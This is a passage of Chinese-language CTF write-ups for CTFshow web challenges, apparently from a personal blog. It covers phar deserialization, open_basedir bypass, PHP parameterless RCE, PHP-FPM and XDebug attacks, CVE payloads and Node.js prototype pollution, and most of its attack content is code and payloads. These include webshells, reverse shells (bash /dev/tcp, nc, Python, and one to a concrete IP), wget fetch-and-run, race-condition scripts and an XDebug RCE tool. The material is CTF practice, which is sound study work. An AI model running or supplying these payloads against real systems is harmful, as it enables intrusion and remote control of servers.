phar生成\n?>\n```\n\n此时phar包中的test.txt中的内容就是我们的一句话木马了\n\n上传文件（记得读取然后url编码一下）\n\n```\npayload:?file=/tmp/phar.phar&content=%3C%3Fphp+__HALT_COMPILER%28%29%3B+%3F%3E%0D%0A6%00%00%00%01%00%00%00%11%00%00%00%01%00%00%00%00%00%00%00%00%00%08%00%00%00test.txt%1A%00%00%00%7E%E7%9Db%1A%00%00%00%C8%C2%DA%2C%A4%01%00%00%00%00%00%00%3C%3Fphp+system%28%24_POST%5Ba%5D%29%3B%3F%3E%FB%C1%FC%A84J%19%C8f%97%29%BA%C7%80v%82%F5%86J%06%02%00%00%00GBMB\n```\n\ninclude干\n\n![截屏2022-06-06 20.00.48](file:///Users/jlan/Library/Application%20Support/typora-user-images/%E6%88%AA%E5%B1%8F2022-06-06%2020.00.48.png?lastModify=1654679483)\n\n**804**\n\n### phar反序列化\n\n这不用教吧\n\n```\n<?php\nclass hacker{\n    public $code;\n}\n\n// @unlink(\"phar.phar\");\n$phar = new Phar(\"phar.phar\"); //后缀名必须为phar\n// $phar = $phar->convertToExecutable(Phar::TAR, Phar::GZ); //压缩规避敏感字符\n$phar->startBuffering();\n$phar->setStub(\"GIF89a\".\"<?php __HALT_COMPILER(); ?>\"); //设置stub\n$o = new hacker();\n$o->code=\"highlight_file('flag.php');\";\n$phar->setMetadata($o); //将自定义的meta-data存入manifest\n$phar->addFromString(\"test.txt\", \"test\"); //添加要压缩的文件\n//签名自动计算\n$phar->stopBuffering();\n// phar生成\n\n?>\n```\n\n上传phar协议读取就行\n\n**805**\n\n### open_basedir绕过\n\n> open_basedir是php.ini中的一个配置选项，可用于将用户访问文件的活动范围限制在指定的区域。\n>\n> 假设open_basedir=/var/www/html/web1/:/tmp/，那么通过web1访问服务器的用户就无法获取服务器上除了/var/www/html/web1/和/tmp/这两个目录以外的文件。\n>\n> 注意：用open_basedir指定的**限制实际上是前缀，而不是目录名**。\n>\n> 文章来自[这里](https://www.cnblogs.com/hookjoy/p/12846164.html)\n\n但是这个配置对系统命令执行是没有效果的，比如执行`system('ls /')`的时候就不受限制，~~但是一般都会被ban掉~~\n\n下面就是一些bypass方法\n\n1. glob协议，只能捞捞文件名\n\n   ```\n     $a = \"glob:///*\";\n     if ( $b = opendir($a) ) {\n       while ( ($file = readdir($b)) !== false ) {\n         echo $file.\"\\n\";\n       }\n       closedir($b);\n     }\n   ```\n\n2. 利用chdir()与ini_set()组合Bypass\n\n   原理在这里\n\n   ```\n   mkdir(\"s\");\n   chdir('s');\n   ini_set('open_basedir','..');\n   chdir('..');\n   chdir('..');\n   chdir('..');\n   chdir('..');\n   ini_set('open_basedir','/');\n   echo file_get_contents(\"/ctfshowflag\");\n   ```\n\n3. 利用bindtextdomain()函数Bypass\n\n   这个方法也只能捞捞文件名\n\n   > **bindtextdomain()函数**\n   >\n   > (PHP 4, PHP 5, PHP 7)\n   >\n   > bindtextdomain()函数用于绑定domain到某个目录的函数。\n   >\n   > ```\n   > bindtextdomain ( string $domain , string $directory ) : string\n   > ```\n   >\n   > bindtextdomain()函数的第二个参数$directory是一个文件路径，它会在$directory存在的时候返回$directory，不存在则返回false。\n\n   我们就可以通过修改directory参数根据返回值来判断文件是否存在\n\n4. 利用SplFileInfo::getRealPath()类方法Bypass\n\n   这个和上面那个很相似，也是基于报错，直接给payload吧\n\n   ```\n   <?php\n   echo '<b>open_basedir: ' . ini_get('open_basedir') . '</b><br />';\n   $info = new SplFileInfo($_GET['dir']);\n   var_dump($info->getRealPath());\n   ?>\n   ```\n\n5. 利用realpath()函数Bypass\n\n   > ### realpath()函数\n   >\n   > (PHP 4, PHP 5, PHP 7)\n   >\n   > realpath — 返回规范化的绝对路径名。它可以去掉多余的../或./等跳转字符，能将相对路径转换成绝对路径。\n   >\n   > 函数定义如下：\n   >\n   > ```\n   > realpath ( string $path ) : string\n   > ```\n   >\n   > ### Bypass\n   >\n   > 环境条件：Windows\n   >\n   > 基本原理是基于报错返回内容的不用，设置自定义的错误处理函数，循环遍历匹配到正则的报错信息的字符来逐个拼接成存在的文件名，另外是需要结合利用Windows下的两个特殊的通配符<和>，不然只能进行暴破。\n\n   ```\n   <?php\n   ini_set('open_basedir', dirname(__FILE__));\n   printf(\"<b>open_basedir: %s</b><br />\", ini_get('open_basedir'));\n   set_error_handler('isexists');\n   $dir = 'E:/wamp64/';\n   $file = '';\n   $chars = 'abcdefghijklmnopqrstuvwxyz0123456789_';\n   for ($i=0; $i < strlen($chars); $i++) {\n           $file = $dir . $chars[$i] . '<><';\n           realpath($file);\n   }\n   function isexists($errno, $errstr)\n   {\n           $regexp = '/File\\((.*)\\) is not within/';\n           preg_match($regexp, $errstr, $matches);\n           if (isset($matches[1])) {\n                   printf(\"%s <br/>\", $matches[1]);\n           }\n   }\n   ?>\n   ```\n\n   可以看到，首字母不同的文件就被列出来了，首字母相同的文件中只列了第一个：\n\n   ![img](https://www.mi1k7ea.com/2019/07/20/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-open-basedir%E7%9A%84%E6%96%B9%E6%B3%95/10.png)\n\n最后是大佬脚本\n\n```\n<?php\n/*\n* by phithon\n* From https://www.leavesongs.com\n* detail: http://cxsecurity.com/issue/WLB-2009110068\n*/\nheader('content-type: text/plain');\nerror_reporting(-1);\nini_set('display_errors', TRUE);\nprintf(\"open_basedir: %s\\nphp_version: %s\\n\", ini_get('open_basedir'), phpversion());\nprintf(\"disable_functions: %s\\n\", ini_get('disable_functions'));\n$file = str_replace('\\\\', '/', isset($_REQUEST['file']) ? $_REQUEST['file'] : '/etc/passwd');\n$relat_file = getRelativePath(__FILE__, $file);\n$paths = explode('/', $file);\n$name = mt_rand() % 999;\n$exp = getRandStr();\nmkdir($name);\nchdir($name);\nfor($i = 1 ; $i < count($paths) - 1 ; $i++){\n    mkdir($paths[$i]);\n    chdir($paths[$i]);\n}\nmkdir($paths[$i]);\nfor ($i -= 1; $i > 0; $i--) { \n    chdir('..');\n}\n$paths = explode('/', $relat_file);\n$j = 0;\nfor ($i = 0; $paths[$i] == '..'; $i++) { \n    mkdir($name);\n    chdir($name);\n    $j++;\n}\nfor ($i = 0; $i <= $j; $i++) { \n    chdir('..');\n}\n$tmp = array_fill(0, $j + 1, $name);\nsymlink(implode('/', $tmp), 'tmplink');\n$tmp = array_fill(0, $j, '..');\nsymlink('tmplink/' . implode('/', $tmp) . $file, $exp);\nunlink('tmplink');\nmkdir('tmplink');\ndelfile($name);\n$exp = dirname($_SERVER['SCRIPT_NAME']) . \"/{$exp}\";\n$exp = \"http://{$_SERVER['SERVER_NAME']}{$exp}\";\necho \"\\n-----------------content---------------\\n\\n\";\necho file_get_contents($exp);\ndelfile('tmplink');\n\nfunction getRelativePath($from, $to) {\n  // some compatibility fixes for Windows paths\n  $from = rtrim($from, '\\/') . '/';\n  $from = str_replace('\\\\', '/', $from);\n  $to   = str_replace('\\\\', '/', $to);\n\n  $from   = explode('/', $from);\n  $to     = explode('/', $to);\n  $relPath  = $to;\n\n  foreach($from as $depth => $dir) {\n    // find first non-matching dir\n    if($dir === $to[$depth]) {\n      // ignore this directory\n      array_shift($relPath);\n    } else {\n      // get number of remaining dirs to $from\n      $remaining = count($from) - $depth;\n      if($remaining > 1) {\n        // add traversals up to first matching dir\n        $padLength = (count($relPath) + $remaining - 1) * -1;\n        $relPath = array_pad($relPath, $padLength, '..');\n        break;\n      } else {\n        $relPath[0] = './' . $relPath[0];\n      }\n    }\n  }\n  return implode('/', $relPath);\n}\n\nfunction delfile($deldir){\n    if (@is_file($deldir)) {\n        @chmod($deldir,0777);\n        return @unlink($deldir);\n    }else if(@is_dir($deldir)){\n        if(($mydir = @opendir($deldir)) == NULL) return false;\n        while(false !== ($file = @readdir($mydir)))\n        {\n            $name = File_Str($deldir.'/'.$file);\n            if(($file!='.') && ($file!='..')){delfile($name);}\n        } \n        @closedir($mydir);\n        @chmod($deldir,0777);\n        return @rmdir($deldir) ? true : false;\n    }\n}\n\nfunction File_Str($string)\n{\n    return str_replace('//','/',str_replace('\\\\','/',$string));\n}\n\nfunction getRandStr($length = 6) {\n    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';\n    $randStr = '';\n    for ($i = 0; $i < $length; $i++) {\n        $randStr .= substr($chars, mt_rand(0, strlen($chars) - 1), 1);\n    }\n    return $randStr;\n}\n```\n\ninclude远程文件后传参file即可\n\n**806**\n\n### php无参RCE\n\n首先是一篇可供参考的[文章](https://blog.csdn.net/qq_45570082/article/details/106602261)\n\n利用方式有以下几种\n\n1. **利用session_id**\n\n   php中有一个函数叫session_id(),可以直接获取到cookie中的phpsessionid值，phpsessionid的组成符号有限定,不能使用 ’ () '，所以我们需要将我们要执行的命令转换成16进制，然后再通过hex2bin函数转换回去，`bin2hex('payload');`来转换16禁止，在使用时通过`eval(hex2bin(session_id(session_start())));`，在加上请求头中Cookie中的`PHPSESSID=16进制payload`执行\n\n2. **利用`get_defined_vars ()`函数**\n\n   `get_defined_vars()`：返回由所有已定义变量所组成的数组\n\n   可供利用的函数\n\n   ```\n   end() - 将内部指针指向数组中的最后一个元素，并输出。\n   next() - 将内部指针指向数组中的下一个元素，并输出。\n   prev() - 将内部指针指向数组中的上一个元素，并输出。\n   reset() - 将内部指针指向数组中的第一个元素，并输出。\n   each() - 返回当前元素的键名和键值，并将内部指针向前移动。\n   ```\n\n   可以看到在已定义的变量中存在着全局变量GET和POST，我们可以通过传入参数来实现RCE\n\n   ```\n   payload:?a=eval(end(current(get_defined_vars())));&b=phpinfo();\n   ```\n\n3. 文件读取\n\n   可供利用的函数\n\n   ```\n   var_dump()  打印所有内容\n   print_r()  同上\n   scandir()  扫描路径内文件名并返回一个迭代器\n   localeconv()  \n   getcwd()  获得当前工作目录\n   getallheaders()  获得请求头内容\n   \n   ```\n\n   \n\n\n\n\n\n\n\n\n\n\n\n\n\n**807**\n\n### 反弹shell\n\n本地监听端口，记住要有公网IP，也可以使用frp内网穿透\n\n1. 公网服务器\n\n   监听命令\n\n   ```\n   攻击端\n   nc -lvp 监听的端口\n   受害端\n   bash -i >& /dev/tcp/攻击端IP/攻击端监听端口 0>&1\n   nc 攻击端IP 攻击端监听端口 -t /bin/bash\n   ```\n\n   利用wget下载执行\n\n   ```\n   wget 攻击端IP/shell.txt -O /tmp/shell.php && php /tmp/shell.php\n   ```\n\n   python脚本反弹\n\n   ```\n   #!/usr/bin/python\n   #-*- coding: utf-8 -*-\n   import socket,subprocess,os\n   s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n   s.connect((\"攻击端IP\",攻击端监听端口)) #更改localhost为⾃⼰的外⽹ip,端⼝任意\n   os.dup2(s.fileno(),0)\n   os.dup2(s.fileno(),1)\n   os.dup2(s.fileno(),2)\n   p=subprocess.call([\"/bin/sh\",\"-i\"])\n   \n   ```\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n**808**\n\n### 卡临时文件包含\n\n```\nimport requests\nimport threading\nimport sys\nsession=requests.session()\nsess='yu22x'\nurl1=\"http://97ccc0d8-b608-44a0-970b-895263a76d15.challenge.ctf.show/\"\nurl2='http://97ccc0d8-b608-44a0-970b-895263a76d15.challenge.ctf.show/?file=/tmp/sess_yu22x'\ndata1={\n    'PHP_SESSION_UPLOAD_PROGRESS':'<?php eval($_POST[1]);?>'\n}\ndata2={\n    '1':'echo 11123;system(\"cat /*\");',\n}\nfile={\n    'file':'1'\n}\ncookies={\n    'PHPSESSID': sess\n}\ndef write():\n    while True:\n        r = session.post(url1,data=data1,files=file,cookies=cookies)\ndef read():\n    while True:\n        r = session.post(url2,data=data2)\n        if '11123' in r.text:\n            print(r.text)\n\nif __name__==\"__main__\":\n    event=threading.Event()\n    with requests.session() as session:\n        for i in range(1,30): \n            threading.Thread(target=write).start()\n        for i in range(1,30):\n            threading.Thread(target=read).start()\n    event.set()\n```\n\n纯纯看运气\n\n**809**\n\n### pear文件包含/RCE\n\n文章[在此](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html)\n\n> pecl是PHP中用于管理扩展而使用的命令行工具，而pear是pecl依赖的类库。在7.3及以前，pecl/pear是默认安装的；在7.4及以后，需要我们在编译PHP的时候指定`--with-pear`才会安装。\n>\n> 不过，在Docker任意版本镜像中，pcel/pear都会被默认安装，安装的路径在`/usr/local/lib/php`。\n>\n> 原本pear/pcel是一个命令行工具，并不在Web目录下，即使存在一些安全隐患也无需担心。但我们遇到的场景比较特殊，是一个文件包含的场景，那么我们就可以包含到pear中的文件，进而利用其中的特性来搞事。\n>\n> 我最早的时候是在阅读phpinfo()的过程中，发现Docker环境下的PHP会开启`register_argc_argv`这个配置。文档中对这个选项的介绍不是特别清楚，大概的意思是，当开启了这个选项，用户的输入将会被赋予给`$argc`、`$argv`、`$_SERVER['argv']`几个变量。\n>\n> 如果PHP以命令行的形式运行（即sapi是cli），这里很好理解。但如果PHP以Server的形式运行，且又开启了`register_argc_argv`，那么这其中是怎么处理的？\n>\n> HTTP数据包中的query-string会被作为argv的值\n\n最终构造的payload如下\n\n```\n?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php\n```\n\n此时/tmp/hello.php文件中就有了我们写入的`<?=phpinfo()?>`，文件包含即可\n\n**810**\n\n### SSRF打PHP-FPM\n\n有工具不用***\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206081711243.png)\n\n记得传入的时候url编码一下\n\n**811**\n\n### file_put_contents打PHP-FPM\n\n文章在[这里](https://blog.csdn.net/sdst_/article/details/118080811)\n\n用的yu22x师傅的脚本\n\n1. 伪造ftp服务器\n\n   ```python\n   import socket\n   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n   s.bind(('0.0.0.0',4566)) #端口可改\n   s.listen(1)\n   conn, addr = s.accept()\n   conn.send(b'220 welcome\\n')\n   #Service ready for new user.\n   #Client send anonymous username\n   #USER anonymous\n   conn.send(b'331 Please specify the password.\\n')\n   #User name okay, need password.\n   #Client send anonymous password.\n   #PASS anonymous\n   conn.send(b'230 Login successful.\\n')\n   #User logged in, proceed. Logged out if appropriate.\n   #TYPE I\n   conn.send(b'200 Switching to Binary mode.\\n')\n   #Size /\n   conn.send(b'550 Could not get the file size.\\n')\n   #EPSV (1)\n   conn.send(b'150 ok\\n')\n   #PASV\n   conn.send(b'227 Entering Extended Passive Mode (127,0,0,1,0,9000)\\n') #STOR / (2)\n   conn.send(b'150 Permission denied.\\n')\n   #QUIT\n   conn.send(b'221 Goodbye.\\n')\n   conn.close()\n   ```\n\n2. gopherus生成payload\n\n   ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206082140193.png)\n\n3. vps监听传参\n\n   ```\n   file=ftp://x.x.x.x:4566&content=gopherus生成的payload(只取下划线后面的内容，且不需要再次编码)\n   ```\n\n**812**\n\n### PHP-FPM未授权\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n"},{"title":"CTFshow其他","url":"/posts/6352d546.html","content":"\n**396**\n\n`parse_url`函数将一个url拆分为如下形式\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210628090124739.png)\n\n无需绕过，直接构造\n\n```\npayload:?url=http://l/l;cat fl0g* >1.txt\n```\n\n**397**\n\n加了个/tmp也没啥卵用，同上即可\n\n**398**\n\n在host处加了/;过滤，也没啥用\n\n**399**\n\n为啥跟host过不去啊，多滤了个>\n\n**400**\n\n过滤http也没用\n\n**401**\n\n同上\n\n**402**\n\n在scheme处过滤http，换个协议就行\n\n**403**\n\n```\nif(preg_match('/^((2[0-4]\\d|25[0-5]|[01]?\\d\\d?)\\.){3}(2[0-4]\\d|25[0-5]|[01]?\\d\\d?)$/', $url['host'])){ \n        shell_exec('curl '.$url['scheme'].$url['host'].$url['path']); \n    } \n```\n\n这里匹配了一个ip地址，上面payload改一下就行\n\n**405**\n\n```php\nif(preg_match('/((2[0-4]\\d|25[0-5]|[01]?\\d\\d?)\\.){3}(2[0-4]\\d|25[0-5]|[01]?\\d\\d?)./', $url['host'])){\n\tif(preg_match('/^\\/[A-Za-z0-9]+$/', $url['path'])){\n\t\tif(preg_match('/\\~|\\.|php/', $url['scheme'])){\n\t\t\tshell_exec('curl '.$url['scheme'].$url['host'].$url['path']);\n\t\t\t}\n\t\t}\n}\n```\n\n第一个在host中匹配IP地址，第二个path不能有字母数字，第三个协议中需要有php\n\n最终payload如下\n\n```\npayload:?url=php://127.0.0.1;cat fl0g.php> 1.txt;11/a\n```\n\n**406**\n\n`filter_var`函数[缺陷](https://www.cnblogs.com/lxfweb/p/13757525.html)\n\n这里过滤器在验证url的合法性\n\n```\n?url=0://www.baidu.com;'union/**/select/**/1,0x3c3f70687020726571756972652027636f6e6669672e706870273b2473716c203d2773656c65637420666c61672066726f6d20666c616720696e746f206f757466696c6520222f7661722f7777772f68746d6c2f312e74787422273b24726573756c74203d2024636f6e6e2d3e7175657279282473716c293b7661725f64756d702824726573756c74293b203f3e/**/into/**/outfile/**/\"/var/www/html/4.php\"%23\n```\n\n访问4.php后访问1.txt即可\n"},{"title":"CTFshowphpCVE","url":"/posts/85a6a528.html","content":"\n**311**\n\nPHP版本7.1.33dev\n\nCVE-2019-11043\n\n[利用脚本](https://github.com/neex/phuip-fpizdam)\n\n**312**\n\nPHP版本5.6.38\n\nCVE-2018-19518\n\n漏洞成因\n\n> IMAP协议（因特网消息访问协议）它的主要作用是邮件客户端可以通过这种协议从邮件服务器上获取邮件的信息，下载邮件等。它运行在TCP/IP协议之上，使用的端口是143。在php中调用的是imap_open函数\n>\n> `imap_open( string $mailbox,string $user,string $password）`\n>\n> 其中参数mailbox,是用来连接邮箱服务器的。它会调用rsh来连接远程shell而，debian/ubuntu中默认使用ssh来代替rsh，又因为ssh命令中可以通过设置`-oProxyCommand=`来调用第三方命令，所以攻击者通过注入这个参数，最终将导致命令执行漏洞。\n\n然后对自己想要发的内容进行一次base64编码\n\n首先对`<?php @eval($_POST[kkk]);?>`进行一次base64编码\n\n然后对`echo \"上个编码内容\" | base64 -d >shell.php`进行一次base64编码\n\n注意：如果进行base64编码后，含有+ =，都要进行url编码即%2b %3d，所以为了保证不会出错，最好再对得到的base64编码后的字符串再进行url编码。相当于步骤为先base64编码，再url编码\n\n然后将hostname的内容替换成`x+-oProxyCommand%3decho%09编码后的内容|base64%09-d|sh}`\n\n```\nhostname=x+-oProxyCommand%3decho%09ZWNobyAiUEQ5d2FIQWdRR1YyWVd3b0pGOVFUMU5VVzJ0cmExMHBPejgrInxiYXNlNjQgLWQgPnNoZWxsLnBocA==|base64%09-d|sh}&username=1&password=1\n```\n\n**313**\n\nPHP版本5.4.1\n\nCVE-2012-1823\n\n该漏洞具体成因可见[P神博客](https://www.leavesongs.com/PENETRATION/php-cgi-cve-2012-1823.html)\n\n> 命令行参数不光可以通过`#!/usr/local/bin/php-cgi -d include_path=/path`的方式传入php-cgi，更可以通过querystring的方式传入。\n>\n> 通过阅读源码，我发现cgi模式下有如下一些参数可用：\n>\n> - `-c` 指定php.ini文件的位置\n> - `-n` 不要加载php.ini文件\n> - `-d` 指定配置项\n> - `-b` 启动fastcgi进程\n> - `-s` 显示文件源码\n> - `-T` 执行指定次该文件\n> - `-h`和`-?` 显示帮助\n\n简单来说，就可以通过参数传递通过以上的参数类型传入不同的内容在执行php时被传入\n\n可通过-d直接修改php中的配置项来达到我们任意写入的效果\n\n```\npayload:?-d+allow_url_include%=on+=auto_append_file=php://input\nPOST:\n<?php system('nl /somewhere/fla9.txt');?>\n```\n\n**314**\n\n包含日志文件就过了////////////\n\n**315**\n\nPHP版本7.1.12，debug开启，端口9000\n\n> 影响\n>\n> XDebug是PHP的一个扩展，用于调试PHP代码。如果目标开启了远程调试模式，并设置remote_connect_back = 1：\n>\n> ```\n> xdebug.remote_connect_back = 1\n> xdebug.remote_enable = 1\n> ```\n>\n> 这个配置下，我们访问http://target/index.php?XDEBUG_SESSION_START=phpstorm，目标服务器的XDebug将会连接访问者的IP（或X-Forwarded-For头指定的地址）并通过dbgp协议与其通信，我们通过dbgp中提供的eval方法即可在目标服务器上执行任意PHP代码。\n\n编写好的脚本，要在公网IP下使用\n\n```python\n#!/usr/bin/env python3\nimport re\nimport sys\nimport time\nimport requests\nimport argparse\nimport socket\nimport base64\nimport binascii\nfrom concurrent.futures import ThreadPoolExecutor\n\n\npool = ThreadPoolExecutor(1)\nsession = requests.session()\nsession.headers = {\n    'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)'\n}\n\ndef recv_xml(sock):\n    blocks = []\n    data = b''\n    while True:\n        try:\n            data = data + sock.recv(1024)\n        except socket.error as e:\n            break\n        if not data:\n            break\n\n        while data:\n            eop = data.find(b'\\x00')\n            if eop < 0:\n                break\n            blocks.append(data[:eop])\n            data = data[eop+1:]\n\n        if len(blocks) >= 4:\n            break\n    \n    return blocks[3]\n\n\ndef trigger(url):\n    time.sleep(2)\n    try:\n        session.get(url + '?XDEBUG_SESSION_START=phpstorm', timeout=0.1)\n    except:\n        pass\n\n\nif __name__ == '__main__':\n    parser = argparse.ArgumentParser(description='XDebug remote debug code execution.')\n    parser.add_argument('-c', '--code', required=True, help='the code you want to execute.')\n    parser.add_argument('-t', '--target', required=True, help='target url.')\n    parser.add_argument('-l', '--listen', default=9000, type=int, help='local port')\n    args = parser.parse_args()\n    \n    ip_port = ('0.0.0.0', args.listen)\n    sk = socket.socket()\n    sk.settimeout(10)\n    sk.bind(ip_port)\n    sk.listen(5)\n\n    pool.submit(trigger, args.target)\n    conn, addr = sk.accept()\n    conn.sendall(b''.join([b'eval -i 1 -- ', base64.b64encode(args.code.encode()), b'\\x00']))\n\n    data = recv_xml(conn)\n    print('[+] Recieve data: ' + data.decode())\n    g = re.search(rb'<\\!\\[CDATA\\[([a-z0-9=\\./\\+]+)\\]\\]>', data, re.I)\n    if not g:\n        print('[-] No result...')\n        sys.exit(0)\n\n    data = g.group(1)\n\n    try:\n        print('[+] Result: ' + base64.b64decode(data).decode())\n    except binascii.Error:\n        print('[-] May be not string result...')\n```\n\n环境寄了，没得结果\n"},{"title":"Python pickle反序列化","url":"/posts/76010d11.html","content":"\n### 什么是pickle\n\npickle是Python专用的一个进行序列化和反序列化的工具包，pickle能表示Python几乎所有的类型（包括自定义类型），由一系列opcode组成，模拟了类似堆栈的内存。\n\n与PHP序列化或者JSON，这些以键值对形式存储序列化对象数据的不同，pickle 序列化（Python独有）是将一个 `Python 对象`及其所拥有的层次结构变成可以持久化储存的`二进制数据`，无法像JSON 一样直观阅读。在Python中，采用术语 `封存 (pickling)`和` 解封 (unpickling)`来描述序列化。\n\n#### **可序列化的对象**\n\n节选自官方文档：pickle — Python 对象序列化\n\n> None, True, 和False;\n> 整数、浮点数、复数；\n> 字符串、字节、字节数组；\n> 元组、列表、集合和仅包含可提取对象的字典；\n> 在模块顶层定义的函数（内置的和用户定义的）（使用def，不是lambda）；\n> 在模块顶层定义的类；\n> 某些类实例，这些类的 `__dict__ `属性值或` __getstate__()` 函数的返回值可以被封存（详情参阅 封存类实例 这一段）。\n\n#### 手搓opcode\n"},{"title":"CTFshowNodejs","url":"/posts/56040919.html","content":"\n# nodejs\n\n首先要知道nodejs是啥，其实就是javascript的后端版本\n\n一些有的没的的入门知识\n\n[nodejs一些入门特性&&实战](https://xz.aliyun.com/t/7752#toc-5)\n\n**nodejs调用系统命令的方式**\n\n如果你要是使用nodejs，你需要调用引用`child_process`模块：\n\n```js\nvar exec = require('child_process').exec;\nvar cmd = 'prince -v builds/pdf/book.html -o builds/pdf/book.pdf';\n\nexec(cmd, function(error, stdout, stderr) {\n  // 获取命令执行的输出\n});\n```\n\n这里使用的是`child_process.exec`来在nodejs程序里执行系统命令。如果你想在shell里执行命令并且要处理命令输出的I/O数据流，输出的体积比较大的话，我们需要使用`child_process.spawn`：\n\n```js\nvar spawn = require('child_process').spawn;\nvar child = spawn('prince', [\n  '-v', 'builds/pdf/book.html',\n  '-o', 'builds/pdf/book.pdf'\n]);\n\nchild.stdout.on('data', function(chunk) {\n  // output will be here in chunks\n});\n\n// or if you want to send output elsewhere\nchild.stdout.pipe(dest);\n```\n\n如果你想在nodejs里执行的是一个文件，而不是一个简单的命令，那你就需要使用`child_process.execFile`，这个方法的参数几乎和`spawn`一样，只是多了第四个回调函数参数，和`exec`里的回调函数参数一样：\n\n```js\nvar execFile = require('child_process').execFile;\nexecFile(file, args, options, function(error, stdout, stderr) {\n  // command output is in stdout\n});\n```\n\n上面的这些方法在nodejs里都是异步执行的，到但有时候我们需要同步执行一些任务，下面的一些代码例子是使用同步的方法调用系统命令执行任务：\n\n```js\n'use strict';\n\nconst\n    spawn = require( 'child_process' ).spawnSync,\n    ls = spawn( 'ls', [ '-lh', '/usr' ] );\n\nconsole.log( `stderr: ${ls.stderr.toString()}` );\nconsole.log( `stdout: ${ls.stdout.toString()}` );\nconst execSync = require('child_process').execSync;\n\nvar cmd = execSync('prince -v builds/pdf/book.html -o builds/pdf/book.pdf');\n```\n\n简单来说，调用系统命令传入的方法是\n\n\n\n在JSON解析的情况下，`__proto__`会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历object2的时候会存在这个键。\n\n\n\n\n\n\n\n\n\n**334**\n\n```javascript\nvar findUser = function(name, password){\n  return users.find(function(item){\n    return name!=='CTFSHOW' && item.username === name.toUpperCase() && item.password === password;\n  });\n};\n```\n\n直接小写就行`ctfshow+123456`\n\n**335**\n\n看源代码发现eval参数，尝试传入ls回显未找到文件，传入1+1回显2，怀疑执行了nodejs中的eval函数\n\n> 在nodejs中，eval()方法用于计算字符串，并把它作为脚本代码来执行，语法为“eval(string)”；如果参数不是字符串，而是整数或者是Function类型，则直接返回该整数或Function。\n\n构造一个系统命令执行的payload\n\n```javascript\nrequire(\"child_process\").execSync('ls')\n```\n\n拿到文件名直接cat就行\n\n**336**\n\n同上题不过增加了过滤\n\n换一个方法\n\n```javascript\nrequire('child_process').spawnSync('ls', []).stdout.toString()\n```\n\n**337**\n\n源码在此\n\n```javascript\nvar express = require('express');\nvar router = express.Router();\nvar crypto = require('crypto');\n\nfunction md5(s) {\n  return crypto.createHash('md5')\n    .update(s)\n    .digest('hex');\n}\n\n/* GET home page. */\nrouter.get('/', function(req, res, next) {\n  res.type('html');\n  var flag='xxxxxxx';\n  var a = req.query.a;\n  var b = req.query.b;\n  if(a && b && a.length===b.length && a!==b && md5(a+flag)===md5(b+flag)){\n  \tres.end(flag);\n  }else{\n  \tres.render('index',{ msg: 'tql'});\n  }\n  \n});\n\nmodule.exports = router;\n```\n\n要求就是传入的ab长度相等，内容不想等，加上flag字符串变量后md5运算的结果相同\n\n> 在javascript中加法的规则很简单，只能数字与数字相加或字符串和字符串相加；所有其他类型的值都会自动转换成这两个类型的值。而对象类型经过toString转换后结果为[object Object]字符串\n\n所以最终传入两个数组即可\n\n```\npayload:?a[x]=1&b[x]=2\n```\n\n为啥数组的键值不能是数字\n\n```\na={'x':'1'}\nb={'x':'2'}\n\nconsole.log(a+\"flag{xxx}\")\nconsole.log(b+\"flag{xxx}\")\n二者得出的结果都是[object Object]flag{xxx}，所以md5值也相同\n\n但是如果传a[0]=1&b[0]=2，相当于创了个变量a=[1] b=[2]，再像上面那样打印的时候，会打印出1flag{xxx}和2flag{xxx}\n```\n\n**338**\n\n原型链污染\n\n```javascript\n//login.js\nvar express = require('express');\nvar router = express.Router();\nvar utils = require('../utils/common');\n/* GET home page.  */\nrouter.post('/', require('body-parser').json(),function(req, res, next) {\n  res.type('html');\n  var flag='flag_here';\n  var secert = {};\n  var sess = req.session;\n  let user = {};\n  utils.copy(user,req.body);\n  if(secert.ctfshow==='36dboy'){\n    res.end(flag);\n  }else{\n    return res.json({ret_code: 2, ret_msg: '登录失败'+JSON.stringify(user)});  \n  }\n});\nmodule.exports = router;\n```\n\n`utils.copy(user,req.body);`这个和merge差不多\n\n```\npayload:\nPOST\n{\"__proto__\":{\"ctfshow\":\"36dboy\"}}\n```\n\n**339**\n\n```javascript\n//login.js\nvar express = require('express');\nvar router = express.Router();\nvar utils = require('../utils/common');\n\nfunction User(){\n  this.username='';\n  this.password='';\n}\nfunction normalUser(){\n  this.user\n}\n/* GET home page.  */\nrouter.post('/', require('body-parser').json(),function(req, res, next) {\n  res.type('html');\n  var flag='flag_here';\n  var secert = {};\n  var sess = req.session;\n  let user = {};\n  utils.copy(user,req.body);\n  if(secert.ctfshow===flag){\n    res.end(flag);\n  }else{\n    return res.json({ret_code: 2, ret_msg: '登录失败'+JSON.stringify(user)});  \n  }\n});\nmodule.exports = router;\n```\n\n这要让ctfshow=flag变量，我不行捏，看看旁边的app.js\n\n```javascript\n//api.js\nvar express = require('express');\nvar router = express.Router();\nvar utils = require('../utils/common');\n/* GET home page.  */\nrouter.post('/', require('body-parser').json(),function(req, res, next) {\n  res.type('html');\n  res.render('api', { query: Function(query)(query)});\n});\nmodule.exports = router;\n```\n\n- Function(\"console.log('HelloWolrd')\")()\n\n类似于php中的create_function\n\n对于ejs渲染引擎来说，对opts有原型链污染漏洞\n\n```javascript\nif (opts.outputFunctionName) {\n        prepended += '  var ' + opts.outputFunctionName + ' = __append;' + '\\n';\n}\n```\n\n这里我们就可以污染outputFunctionName来执行恶意代码\n\n```js\n{\"__proto__\":{\"outputFunctionName\":\"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \\\"bash -i >& /dev/tcp/45.15.131.101/2337 0>&1\\\"');var __tmp2\"}}\n```\n\n通过login污染再通过api渲染调用\n\n**340**\n\n```javascript\nvar express = require('express');\nvar router = express.Router();\nvar utils = require('../utils/common');\n/* GET 